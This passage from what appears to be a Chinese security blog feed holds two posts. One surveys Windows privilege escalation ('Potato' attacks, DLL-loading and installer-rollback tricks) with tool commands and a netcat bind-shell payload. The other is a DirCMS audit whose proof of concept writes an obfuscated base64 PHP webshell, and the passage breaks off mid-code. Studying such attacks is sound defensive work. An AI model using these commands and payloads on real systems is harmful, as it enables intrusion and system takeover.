访问权限来“获得对象的所有权，而无需授予任意访问权限”。首先，您必须获得要写入的注册表项的所有权并修改 DACL，以便可以在其上写入。 攻击场景：持久化；防御规避；收集 8. SeDebugPrivilege 它允许持有者调试另一个进程，这包括读取和写入该进程的内存。有许多不同的内存注入策略可以与此特权一起使用，从而规避大多数 AV/HIPS 解决方案。 攻击方式：凭据窃取、提权、防御规避等。 9. SeTcbPrivilege 此权限将其持有者标识为受信任计算机库的一部分。某些受信任的受保护子系统被授予此特权。 攻击场景：权限提升 参考： Windows Token原理及利用 - 网安 渗透技巧——利用Windows的九大权限 - WEB and server security vulnerabilities - 黑客中文论坛网站 基于 Token 提权的利用工具就是常用的 Potato 家族了： Origin Potato(MS08-068) Origin Potato 就是 NTLM-Relay，微软在 kb957097 补丁中通过修复 SMB 身份验证答复的验证方式来防止凭据重播。 当主机 A 向主机 B 进行 SMB 认证的时候，将 pszTargetName 设置为 cifs/B，然后在 type2 拿到 B 发送的 Challenge 之后，在 lsass 里面缓存 (Challenge,cifs/B)，接着 B 拿到 A 的 type3，这时会去检查 lsass 缓存里是否有 (Challenge,cifs/B)，如果有就说明这是同一台主机，那么认证失败。 Hot Potato Hot Potato 是 Potato 家族最早的利用方式，其攻击原理如下： Windows Update 服务以 SYSTEM 权限运行，且会发起 NTLM 认证，如果能够作为中间人，我们就能够通过 NTLM Relay 获取到 SYSTEM 权限。 Windows Update 服务在运行时会默认请求 http://wpad/wpad.dat 这个 URL 以获取网络代理的配置，但这个域名并不是所有主机都会配置，公网上也没有这个域名，根据 Windows 的域名解析顺序（host-&gt; DNS 查询 -&gt; NBNS 查询），只要攻击者伪造一个 NBNS 查询的响应，就能够控制 Windows Update 服务的代理指向自己。 攻击者以中间人的身份完成 NTLM Relay 从而获取到 System 权限的 token。 影响范围： Windows 7,8,10,Server 2008 以及 Server 2012 其步骤如下： Windows Update 服务默认情况下会请求 http://wpad/wpad.dat 来获取网络代理配置。但不是所有的主机都存在保存着该域名解析的结果，当本地 HOST 及 DNS 查询都无法获取该域名的解析结果时，就会触发 NBNS 查询。 攻击者在本地发起 NBNS（NetBIOS 名称服务）欺骗。使得 Windows 在本地广播查询目标 HOST 时，攻击者伪造响应，声称 wpad 服务器 IP 地址为 127.0.0.1，并且返回网络代理配置为 127.0.0.1:80 Windows Update 服务获取到网络代理后，所有的 http 流量就都会经过攻击者搭建的 127.0.0.1:80。 此时 Windows Update 服务进行 NTLM 认证中的 Hash 就会被攻击者捕获，从而发起 NTLM Relay 攻击。 局限： 这种攻击手法需要等待 windows update 服务发起更新请求。 Rotten Potato 攻击原理： COM （组件对象模型）API 可以在指定的网络位置加载一个服务对象。以下面的代码为例，COM API 函数 CoGetInstanceFromIStorage 会根据指定的 IP 地址和端口号 127.0.0.1:6666 去获取指定的对象实例，该对象实例的 Guid 为 4991d34b-80a1-4291-83b6-3328366b9097，对应 BITS 实例。如果此时攻击者在 127.0.0.1:6666 端口正常回复，就可以强制让 COM 以 SYSTEM 权限对 6666 端口发起 net-NTLM 认证。（为什么选择 BITS 实例，是因为 BITS 实现了 IMarshal 接口并允许代理声明强制 NTLM 身份验证） public static void BootstrapComMarshal() { IStorage stg = ComUtils.CreateStorage(); // Use a known local system service COM server, in this cast BITSv1 Guid clsid = new Guid("4991d34b-80a1-4291-83b6-3328366b9097"); TestClass c = new TestClass(stg, String.Format("{0}[{1}]", "127.0.0.1", 6666)); // ip and port MULTI_QI[] qis = new MULTI_QI[1]; qis[0].pIID = ComUtils.IID_IUnknownPtr; qis[0].pItf = null; qis[0].hr = 0; CoGetInstanceFromIStorage(null, ref clsid, null, CLSCTX.CLSCTX_LOCAL_SERVER, c, 1, qis); } 如果我们能够完成这一次 NTLM 认证，就可以获取到 token，作者也使用了一个巧妙的方法，调用 AcceptSecurityContext 函数来处理 NLTM 认证 AcceptSecurityContext 是 Windows API 中用于安全上下文建立的函数之一，特别是在使用安全套接字（Secure Socket Layer，SSL）或者安全的远程过程调用（Remote Procedure Call，RPC）等场景下。它通常用于在服务端接受来自客户端的身份验证，并建立一个安全上下文（security context）以便进行后续的安全通信。这样一来，COM 充当客户端，AcceptSecurityContext 充当服务端，就能够完成 NTLM 认证。 尽管攻击者作为中间人将 AcceptSecurityContext 与 COM 之间建立起了 NTLM 认证，但两者之间的交互过程并不是简单的转发，主要有两个问题： 要正确响应 COM 服务，需要正确的 RPC 协议的数据包。作者将 COM 的请求发送到 135 端口的 rpcss 服务来获取一个响应模板。 两个次 NTLM Challenge 报文中的 NTLM Server Challenge 以及 Reserved 字段不同，需要进行修改。 上述的两个问题解决之后，就可以巧妙地获取到 SYSTEM token。有了 SYSTEM 权限的 token 之后，如果当前用户拥有 SelmpersonatePrivilege 或者 SeAssignPrimaryToken 权限，就可以通过该 Token 创建新进程达成提权。 步骤如下： 利用 CoGetInstanceFromIStorage API 强制 NT AUTHORITY/SYSTEM 运行的 RPC 服务向我们的本地代理(localhost:6666)发起 NTLM 身份验证。 CoGetInstanceFromIStorage API RPC 向代理发送 NTLM Negotiate 包。 代理将 NTLM Negotiate 包转发给端口 135 的 RPC 服务。于此同时，调用 AcceptSecurityContext 来强制进行本地身份验证。 RPC 135 和 AcceptSecurityContext 向代理发送 NTLM Challenge。两个数据包的内容被混合以匹配本地协商并转发到 RPC，其中 RPC 135 响应的报文充当 RPC 调用的模板。 RPC 使用 NLTM Auth 包进行响应，该包被代理服务器发送到 AcceptSecurityContext (8.) 并执行模拟 (9.)。 影响范围： &lt; win10 1809 和 windows server 2019 相关概念： 分布式组件对象模型(DCOM) COM 是 Windows 的一个组件，它促进了软件之间的互操作性，DCOM 通过远程过程调用(RPC)在网络上扩展了这一点。 后台智能传输服务(BITS) 可供程序员和系统管理员用于从 HTTP Web 服务器和 SMB 文件共享下载文件或将文件上传到其中。 Windows Update： BITS 服务用于下载和安装 Windows 更新。 Windows Defender 病毒定义更新： BITS 用于后台更新 Windows Defender 病毒定义。 应用程序和系统更新： 第三方应用程序和系统组件可以利用 BITS 进行后台更新。 CLSID是标识 COM 类对象的全局唯一标识符。它是一个类似UUID的标识符。 Juicy Potato Rotten Potato 的 PoC 使用了 COM 来激活 BITS 服务。Windows 在修补 Rotten Potato 时，禁用了 BITS 服务，并且占用了 6666 端口，但该修补并不能完全杜绝这类问题，作者找到了其他可以选择的 COM 对象，也可以发起 NTLM 请求。 其具体利用过程与 Rotten Potato 类似： Juicy Potato 通过传递 BITS 的 CLSID 和 IStorage 对象实例给 CoGetInstanceFromIStorage 函数，使得 rpcss 激活 BITS 服务。 随后 rpcss 的 DCOM OXID resolver 会解析序列化数据中的 OBJREF 拿到DUALSTRINGARRAY 字段，该字段指定了 host[port] 格式的 location，绑定对象时会向其中的 host[port] 发送 DEC/RPC 请求，这时，如果攻击者控制了这个端口，就可以要求进行 NTLM 身份验证，那么高权限服务就会发送 net-NTLM 进行认证。 其后的过程与 Rotten Potato 一致 影响范围： &lt; Windows 10 1809 &lt; Windows Server 2019 Pipe Potato（PrintSpoofer） 命名管道提权原理： windows 中有一个 API ImpersonateNamedPipeClient()，允许服务端进程对连接到它的客户端进程进行模拟。通过调用 ImpersonateNamedPipeClient()，命名管道服务端可以模拟命名管道客户端的安全上下文，从而直接将命名管道服务端当前线程的 Token 令牌更改为命名管道客户端的 Token令牌。 因此命名管道提权的原理大多类似，一般是诱使 system 权限的服务访问我们创建的命名管道。 PrintSpoofer 原理： Windows 的 MS-RPRN 协议用于打印客户机和打印服务器之间的通信，默认情况下启用。同时，Print Spooler 服务的 RPC 接口暴露在命名管道：\.\pipe\spoolss 中，该服务默认开启。 MS-RPRN 协议定义的 RpcRemoteFindFirstPrinterChangeNotificationEx() 函数创建一个远程更改通知对象，该对象监视对打印机对象的更改，并将更改通知发送到打印客户端，并且就是通过命名管道实现进程之间的通信。 DWORD RpcRemoteFindFirstPrinterChangeNotificationEx( /* [in] */ PRINTER_HANDLE hPrinter, /* [in] */ DWORD fdwFlags, /* [in] */ DWORD fdwOptions, /* [unique][string][in] */ wchar_t *pszLocalMachine, /* [in] */ DWORD dwPrinterLocal, /* [unique][in] */ RPC_V2_NOTIFY_OPTIONS *pOptions) 其中 pszLocalMachine 是指向表示客户端计算机名称的字符串的指针，需要传递一个 UNC 路径，传递 \127.0.0.1 时，服务器会访问 \127.0.0.1\pipe\spoolss，但这个管道已经被系统注册了，并由 NT AUTHORITY\SYSTEM 控制。如果我们传入是 \127.0.0.1\pipe\demo， spoolsv.exe 进程也会对Server name做了校验，最后还是会替换成 \192.168.110.137\pipe\spools 管道。 作者在这里利用了 windows UNC 路径规范化的技巧绕过了这个限制 考虑到 UNC 路径的性质，如果主机名包含 /，它将通过路径检查，但真正连接的时候会转化为 \ 。那么，如果传递一个 \127.0.0.1/pipe/foo，检查时会认为 127.0.0.1/pipe/foo 是一个主机名，随后在连接 named pipe 时会对参数做标准化，于是就会连接 \127.0.0.1\pipe\foo\pipe\spoolss，那么攻击者就可以把主机名改为 \127.0.0.1/pipe/foo 并注册这个 named pipe 从而窃取 client 的 token。 利用工具： itm4n/PrintSpoofer: Abusing impersonation privileges through the “Printer Bug” 参考： Windows 命名管道客户端模拟和 PrintSpoofer 原理探究 Bad Potato BadPotato是C#版本的PrintSpooler，结构代码也更加简化，并且恶意管道服务端用的是对方机器的名字，而PrintSpooler用的是随机生成的UUID，pipePotato则是固定的”xxx”（导致可用性也更低） 利用工具： BeichenDream/BadPotato: Windows 权限提升 BadPotato Rogue Potato 为了修补 Juicy Potato，高版本的 Windows DCOM 解析器不允许 OBJREF 中的 DUALSTRINGARRAY 字段指定端口号。 利用条件： 我们需要有一台机器在我们的控制之下，我们可以在其中执行重定向，并且受害者必须可以在端口 135上访问该机器 我们需要上传两个 exe 文件，当受害者的防火墙不接受传入连接时，也可以在我们控制的 Windows 机器上以独立模式启动伪造的 OXID 解析器 利用思路： Rogue Potato 的利用思路是在远程服务器的 135 端口上做一个转发，用于将 OXID 解析请求重定向到一个假的OXID RPC 服务器。 伪造的OXID RPC 服务器实现了ResolveOxid2服务器过程，该过程将指向受控命名管道[ncacn_np:localhost/pipe/roguepotato[\pipe\epmapper] DCOM 服务器将连接到 RPC 服务器以执行 IRemUnkown2 接口调用。通过连接到命名管道，将执行”身份验证回调”，我们可以通过 RpcImpersonateClient()调用模拟调用者。 然后,令牌窃取者 1.获取rpcss服务的PID 2.打开进程，列出所有句柄，并为每个句柄尝试复制它并获取句柄类型 3.如果句柄类型为”Token”且令牌所有者为 SYSTEM，则尝试使用CreatProcessAsUser()或CreateProcessWithToken()模拟并启动进程 影响范围： &gt;= Windows 10 1809 &amp; Windows Server 2019 利用工具： https://github.com/antonioCoco/RoguePotato # Network redirector / port forwarder to run on your remote machine, must use port 135 as src port socat tcp-listen:135,reuseaddr,fork tcp:10.0.0.3:9999 # RoguePotato without running RogueOxidResolver locally. You should run the RogueOxidResolver.exe on your remote machine. # Use this if you have fw restrictions. RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" # RoguePotato all in one with RogueOxidResolver running locally on port 9999 RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999 #RoguePotato all in one with RogueOxidResolver running locally on port 9999 and specific clsid and custom pipename RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999 -c "{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}" -p splintercode EfsPotato（PetitPotam） 利用EFSRPC（加密文件系统远程协议），进行NTLM中继攻击可实现AD域内权限提升或本地权限提升。 影响范围： Windows Server, version 20H2 (Server Core Installation) Windows Server, version 2004 (Server Core installation) Windows Server 2019 (Server Core installation) Windows Server 2019 Windows Server 2016 (Server Core installation) Windows Server 2016 Windows Server 2012 R2 (Server Core installation) Windows Server 2012 R2 Windows Server 2012 (Server Core installation) Windows Server 2012 Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation) Windows Server 2008 for x64-based Systems Service Pack 2 Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation) Windows Server 2008 for 32-bit Systems Service Pack 2 Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) Windows Server 2008 R2 for x64-based Systems Service Pack 1 利用工具： zcgonvh/EfsPotato: Exploit for EfsPotato(MS-EFSR EfsRpcOpenFileRaw with SeImpersonatePrivilege local privalege escalation vulnerability). bugch3ck/SharpEfsPotato: Local privilege escalation from SeImpersonatePrivilege using EfsRpc. Ghost potato（MS08-068 绕过） 为防止用户 relay 本机，在 lsass 中添加缓存绕过，如果缓存中有 (Challenge,cifs/B) 就会认证失败。 然而这个 (Challenge,cifs/B) 是有时效性的（300s），所有只要等 300s 再发送 type3 就可以 bypass 了。 用修改后的 impacket https://shenaniganslabs.io/files/impacket-ghostpotato.zip 可以直接打，用法和MS08-068 类似。 Sweet Potato 集成了前面几种土豆触发 NTLM 认证的方式，包括：COM，WinRM，Spoolsv，其中 WInRM 的攻击原理参考：https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/ 大致思路就是当 WinRM 在当前系统未启用时，攻击者监听本机 5985 端口，BITS 服务会向 WinRM 5985 发起 NTLM 认证。 RottenPotato Weaponized JuciyPotato with BITS WinRM discovery PrintSpoofer discovery and original exploit EfsRpc built on EfsPotato PetitPotam 利用工具：CCob/SweetPotato: Local Service to SYSTEM privilege escalation from Windows 7 to Windows 10 / Server 2019 Generic Potato SweetPotato 的修改版本， 是@micahvandeusen 用于支持通过 HTTP 和/或命名管道模拟身份验证。 这允许从 SSRF 和/或文件写入进行本地权限升级。 在以下情况下它很方便： 我们有权访问的用户拥有 SeImpersonatePrivilege 系统没有运行打印服务，这会阻止 SweetPotato 。 WinRM 正在运行以防止 RogueWinRM 您不允许对您控制的任何计算机进行出站 RPC，并且禁用 BITS 服务以防止 RoguePotato 。 利用工具： micahvandeusen/GenericPotato: Impersonating authentication over HTTP and/or named pipes. JuicyPotatoNG Giving JuicyPotato a second chance: JuicyPotatoNG – Decoder’s Blog 利用工具： antonioCoco/JuicyPotatoNG: Another Windows Local Privilege Escalation from Service Account to System GodPotato 影响范围： Windows Server 2012 - Windows Server 2022 Windows8 - Windows 11 利用工具： BeichenDream/GodPotato 靶场 Juicy Potato - HackTheBox-Jeeves Rogue Potato - HackTheBox-Remote 参考： Potatoes - Windows Privilege Escalation · Jorge Lajara Website Potato 家族提权分析 - Geekby’s Blog 【精选】Rotten/Juicy Potato提权工原理分析_rottenpotato-CSDN博客 Potato 家族提权学习 NTLM-relay攻击的原理与实现 Windows 命名管道客户端模拟和 PrintSpoofer 原理探究 通过特权文件写入提权 DiagHub 从版本 1903 及更高版本开始，DiagHub 不能再用于加载任意 DLL。 Microsoft 诊断中心标准收集器服务 (DiagHub) 是一项收集跟踪信息并通过 DCOM 以编程方式公开的服务。 该 DCOM 对象可用于将 DLL 加载到 SYSTEM 进程中，前提是该 DLL 存在于 C:\Windows\System32 目录中。 利用步骤： 创建一个邪恶的 DLL 例如：payload.dll 并将其移至 C:\Windows\System32 build https://github.com/xct/diaghub diaghub.exe c:\ProgramData\ Payload.dll 默认有效负载将运行 C:\Windows\System32\spool\drivers\color\nc.exe -lvp 2000 -e cmd.exe UsoDLLLoader 2020-06-06 更新：此技巧不再适用于最新版本的 Windows 10 Insider Preview。 如果我们在 Windows 或某些第三方软件中发现特权文件写入漏洞，我们可以将自己版本的 windowscoredeviceinfo.dll 复制到 C:\Windows\Sytem32\中，然后让 USO 服务以 NT AUTHORITY\System 的身份加载它。 利用步骤： 构建 https://github.com/itm4n/UsoDllLoader 选择发布配置和 x64 架构。 构建解决方案。 DLL .\x64\Release\WindowsCoreDeviceInfo.dll 加载程序.\x64\Release\UsoDllLoader.exe。 将 WindowsCoreDeviceInfo.dll 复制到 C:\Windows\System32\ 使用加载程序并等待 shell 或运行 usoclient StartInteractiveScan 并连接到端口 1337 上的绑定 shell。 WerTrigger 利用 Windows 问题报告写入特权。 利用步骤： 克隆 https://github.com/sailay1996/WerTrigger 将 phoneinfo.dll 复制到C:\Windows\System32\ 将 Report.wer 文件和 WerTrigger.exe 放在同一目录中。 然后，运行 WerTrigger.exe。 享受 NT AUTHORITY\SYSTEM 的 shell WerMgr 利用 Windows 错误报告的特权目录创建错误达成提权 利用步骤： Clone https://github.com/binderlabs/DirCreate2System Create directory C:\Windows\System32\wermgr.exe.local\ Grant access to it: cacls C:\Windows\System32\wermgr.exe.local /e /g everyone:f Place spawn.dll file and dircreate2system.exe in a same directory and run .\dircreate2system.exe. Enjoy a shell as NT AUTHORITY\SYSTEM 通过特权文件删除提权 在 MSI 安装期间，Windows Installer 服务会维护每个更改的记录，以防需要回滚，为此它将创建： C:\Config.Msi 中的文件夹包含 回滚脚本 (.rbs) 回滚文件 (.rbf) 要将特权文件删除转换为本地权限提升，您需要滥用 Windows Installer 服务。 Windows Installer 创建受保护的 C:\Config.Msi 文件夹后立即将其删除 重新创建具有弱 DACL 权限的 C:\Config.Msi 文件夹，因为普通用户可以在 C:\ 根目录下创建文件夹。 将恶意 .rbs 和 .rbf 文件放入其中，以便由 MSI 回滚执行 然后在回滚时，Windows Installer 将对系统进行任意更改 触发此链的最简单方法是使用 zdi/FilesystemEoPs/FolderOrFileDeleteToSystem。 该漏洞利用包含一个具有 2 个操作的 .msi 文件，第一个操作会产生延迟，第二个操作会引发错误以使其回滚。 此回滚将“恢复”C:\Program Files\Common Files\microsoft shared\ink\HID.dll 中的恶意 HID.dll。 然后使用 [CTRL]+[ALT]+[DELETE] 切换到安全桌面并打开屏幕键盘 (osk.exe)。 osk.exe进程首先查找C:\Program Files\Common Files\microsoft共享\ink\HID.dll库而不是C:\Windows\System32\HID.dll Windows 域内提权 WSUS WSUS 是微软推出的免费的 Windows 更新管理服务，当我们获得了WSUS服务器的控制权限后，可以通过推送补丁的方式进行横向移动。这个利用方法最早公开在BlackHat USA 2015。 利用工具 https://github.com/nettitude/SharpWSUS https://github.com/AlsidOfficial/WSUSpendu https://github.com/ThunderGunExpress/Thunder_Woosus 以上三个工具的实现原理基本相同，都是创建一个调用psexec执行命令的补丁，将补丁推送至指定计算机，等待目标计算机更新补丁 嘶货 KrbRelayUp CVE-2022–26923 域内提权漏洞。 这本质上是在不强制执行 LDAP 签名（默认设置）的 Windows 域环境中的通用无修复本地权限升级。 这意味着每台域内 Windows 主机都只要未更改默认设置并强制执行 LDAP 签名设置，就容易受到攻击。这种利用方式不需要拥有管理员权限。 No-Fix Local Privilege Escalation Using KrbRelay With Shadow Credentials - Icyguider’s Blog From unprivileged user to system - KrbRelayUp - wwwGeneral 参考资料 PayloadsAllTheThings/Methodology and Resources/Windows - Privilege Escalation.md at master · swisskyrepo/PayloadsAllTheThings 手把手教你Windows提权 - FreeBuf网络安全行业门户 windows-security/Readme_full.md at master · alphaSeclab/windows-security]]></summary></entry><entry><title type="html">DirCMS 审计</title><link href="/code%20audit/2023/08/09/DirCMS-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.html" rel="alternate" type="text/html" title="DirCMS 审计" /><published>2023-08-09T13:34:21+08:00</published><updated>2023-08-09T13:34:21+08:00</updated><id>/code%20audit/2023/08/09/DirCMS-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1</id><content type="html" xml:base="/code%20audit/2023/08/09/DirCMS-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.html"><![CDATA[<h1 id="dircms-审计">DirCMS 审计</h1>

<h2 id="环境搭建">环境搭建</h2>
<ul>
  <li>官网链接：http://www.dircms.cc/</li>
  <li>下载地址：<a href="https://gitee.com/greenlaw/dircms6/">dircms6</a></li>
</ul>

<h2 id="目录结构">目录结构</h2>
<h3 id="代码目录结构">代码目录结构</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">.</span>
├── admin.php
├── api
├── cache
├── config
├── dircms
├── favicon.ico
├── index.php
├── install.php
├── LICENSE
├── mobile
├── nginx.htaccess
├── README.en.md
├── README.md
├── static
├── template
├── test.php
└── uploadfile
</code></pre></div></div>
<ul>
  <li>dircms 为框架内核文件，基于迅睿 CMS 框架：<a href="http://help.xunruicms.com/">迅睿CMS框架</a></li>
</ul>

<h3 id="mvc-结构">MVC 结构</h3>
<ul>
  <li>控制器：功能相关控制器存放在 dircms/App 目录下</li>
  <li>服务类（Service）：存放在 dircms/Fcms/Core/Service.php</li>
  <li>基础类：存放在 dircms/Fcms/Library 目录下</li>
</ul>

<p>数据流：控制器 -&gt; 服务类 Service -&gt; 类加载（加载基础类）</p>

<h3 id="api">API</h3>
<ul>
  <li>pay</li>
  <li>ueditor</li>
</ul>

<h2 id="安全防护">安全防护</h2>
<ul>
  <li>dircms/Fcms/Library/Security.php 存在 XSS 过滤函数 xss_clean，其中除了 xss 过滤之外，还有部分的 php 函数过滤。
    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$str</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span>
  <span class="s1">'#(alert|prompt|confirm|cmd|passthru|eval|exec|expression|system|fopen|fsockopen|file|file_get_contents|readfile|unlink)(\s*)\((.*?)\)#si'</span><span class="p">,</span>
  <span class="s1">'\\1\\2&amp;#40;\\3&amp;#41;'</span><span class="p">,</span>
  <span class="nv">$str</span>
<span class="p">);</span>
</code></pre></div>    </div>
  </li>
</ul>

<h2 id="漏洞挖掘">漏洞挖掘</h2>

<h3 id="后台代码执行模板解析导致-rce">后台代码执行（模板解析导致 RCE）</h3>
<p>dircms/Fcms/Core/Helper.php 中存在一个 php55_replace_function 函数：</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">function</span> <span class="n">php55_replace_function</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="nv">$value</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
            <span class="c1">// 执行函数体</span>
            <span class="nv">$param</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'$data'</span> <span class="o">?</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">:</span> <span class="nv">$value</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
            <span class="k">return</span> <span class="nb">call_user_func_array</span><span class="p">(</span>
                <span class="nv">$value</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span>
                <span class="nb">is_array</span><span class="p">(</span><span class="nv">$param</span><span class="p">)</span> <span class="o">?</span> <span class="p">[</span><span class="s1">'data'</span> <span class="o">=&gt;</span> <span class="nv">$param</span><span class="p">]</span> <span class="o">:</span> <span class="o">@</span><span class="nb">explode</span><span class="p">(</span><span class="s1">','</span><span class="p">,</span> <span class="nv">$param</span><span class="p">)</span>
            <span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">return</span> <span class="s1">'函数['</span><span class="mf">.</span><span class="nv">$value</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="mf">.</span><span class="s1">']未定义'</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="nv">$value</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="p">}</span>
</code></pre></div></div>
<p>该函数调用了 call_user_func_array 函数，一旦传入的参数 $value 可控，则可以执行任意 php 函数。</p>

<p>php55_replace_function 函数调用点较多，其中 dircms/Fcms/Library/Seo.php 中的 search 函数也用到了该方法，部分代码如下：</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$rep</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">\php5replace</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
    <span class="mf">...</span>
<span class="nv">$seo</span><span class="p">[</span><span class="s1">'meta_title'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'%'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nb">preg_replace_callback</span><span class="p">(</span><span class="s1">'#{([a-z_0-9]+)\((.*)\)}#Ui'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="nv">$rep</span><span class="p">,</span> <span class="s1">'php55_replace_function'</span><span class="p">),</span> <span class="nv">$seo</span><span class="p">[</span><span class="s1">'meta_title'</span><span class="p">]));</span>
<span class="mf">...</span>
</code></pre></div></div>
<p>使用正则表达式匹配 <code class="language-plaintext highlighter-rouge">$seo['meta_title'])</code> 的值，匹配内容包含整个函数调用。但是这里的执行也有一定限制：</p>

<ol>
  <li>函数名只能匹配小写字母、数字与下划线。</li>
  <li>无法嵌套函数调用。</li>
</ol>

<p><code class="language-plaintext highlighter-rouge">$seo['meta_title'])</code>来源于后台 SEO 设置，在”设置”-&gt; SEO 设置 -&gt; 搜索 SEO 中可以设置 SEO 标题，在其中的内容中添加一个函数调用：</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="n">第</span><span class="p">{</span><span class="n">page</span><span class="p">}</span><span class="n">页</span><span class="p">{</span><span class="n">join</span><span class="p">}][{</span><span class="n">keyword</span><span class="p">}{</span><span class="n">join</span><span class="p">}][{</span><span class="n">param</span><span class="p">}{</span><span class="n">join</span><span class="p">}]{</span><span class="n">modulename</span><span class="p">}{</span><span class="n">join</span><span class="p">}{</span><span class="no">SITE_NAME</span><span class="p">}{</span><span class="nb">phpinfo</span><span class="p">(</span><span class="mi">1</span><span class="p">)}</span>
</code></pre></div></div>
<p>保存之后，再在前端访问搜索页面:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/index.php?s=news&amp;c=search&amp;keyword=1111
</code></pre></div></div>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20230807222653.png" alt="20230807222653" /></p>

<p>当尝试使用 system 执行命令时，会发现输入的 system() 中的括号会被 html 转义，其过滤函数可以定位到 dircms/Fcms/Library/Security.php 中的 xss_clean 函数，该函数除了会进行 XSS 的过滤，还会进行 PHP 标签 <code class="language-plaintext highlighter-rouge">&lt;?</code> 以及敏感函数的过滤，如下所示：</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$str</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span>
    <span class="s1">'#(alert|prompt|confirm|cmd|passthru|eval|exec|expression|system|fopen|fsockopen|file|file_get_contents|readfile|unlink)(\s*)\((.*?)\)#si'</span><span class="p">,</span>
    <span class="s1">'\\1\\2&amp;#40;\\3&amp;#41;'</span><span class="p">,</span>
    <span class="nv">$str</span>
<span class="p">);</span>
</code></pre></div></div>
<p>其中过滤了常见的一些命令执行函数，但并不完全，综合来看，我们需要找到满足下面条件的函数去执行命令：</p>
<ol>
  <li>不在黑名单内。</li>
  <li>不能嵌套函数。</li>
</ol>

<p>例如，我们可以使用 file_put_content 结合 php://filter 来写入文件，例如：</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">file_put_contents</span><span class="p">(</span><span class="s2">"php://filter/write=convert.base64-decode/resource=evil.php"</span><span class="p">,</span><span class="s2">"PD9waHAgJHFlQWY9Y3JlYXRlX2Z1bmN0aW9uKHN0cl9yb3QxMygnJCcpLmJhc2U2NF9kZWNvZGUoJ2N3PT0nKS5zdHJfcm90MTMoJ2InKS5jaHIoNTAxLTM5MikuYmFzZTY0X2RlY29kZSgnWlE9PScpLGNocigweDEzMC0weGNiKS5jaHIoMHhmZDg0LzB4MjI2KS5iYXNlNjRfZGVjb2RlKCdZUT09Jykuc3RyX3JvdDEzKCd5JykuY2hyKDA1NjI1MC8wMTEyMSkuY2hyKDA1MDY2NC8wMTEwNSkuYmFzZTY0X2RlY29kZSgnY3c9PScpLmJhc2U2NF9kZWNvZGUoJ2J3PT0nKS5jaHIoMHgyYjAtMHgyNDMpLmJhc2U2NF9kZWNvZGUoJ1pRPT0nKS5jaHIoMHg2ZjI2LzB4MmI2KS5jaHIoMDQ3NTEwLzA1MzApKTskcWVBZihiYXNlNjRfZGVjb2RlKCdPRGM1TicuJ2pjM08wJy4nQmxka0YnLidzS0NSZicuJycuc3RyX3JvdDEzKCdIJykuY2hyKDAxNzMxMzIvMDE2MjIpLmNocig1MDQ0NS84ODUpLmNocig3MDItNjE4KS5iYXNlNjRfZGVjb2RlKCdWZz09JykuJycuJycuY2hyKDU2MDcwLzgwMSkuc3RyX3JvdDEzKCdnJykuY2hyKDMwNjE4LzM3OCkuY2hyKDB4M2Q2LTB4MzcyKS5zdHJfcm90MTMoJ2EnKS4nJy4nUklWSGwnLidFUkYwcCcuJ096STJNJy4nemt3TXonLidFNycuJycpKTs/Pg=="</span><span class="p">);</span>
</code></pre></div></div>

<p>poc 如下：</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="n">第</span><span class="p">{</span><span class="n">page</span><span class="p">}</span><span class="n">页</span><span class="p">{</span><span class="n">join</span><span class="p">}][{</span><span class="n">keyword</span><span class="p">}{</span><span class="n">join</span><span class="p">}][{</span><span class="n">param</span><span class="p">}{</span><span class="n">join</span><span class="p">}]{</span><span class="n">modulename</span><span class="p">}{</span><span class="n">join</span><span class="p">}{</span><span class="no">SITE_NAME</span><span class="p">}{</span><span class="nb">file_put_contents</span><span class="p">(</span><span class="n">php</span><span class="o">://</span><span class="n">filter</span><span class="o">/</span><span class="n">write</span><span class="o">=</span><span class="n">convert</span><span class="mf">.</span><span class="n">base64</span><span class="o">-</span><span 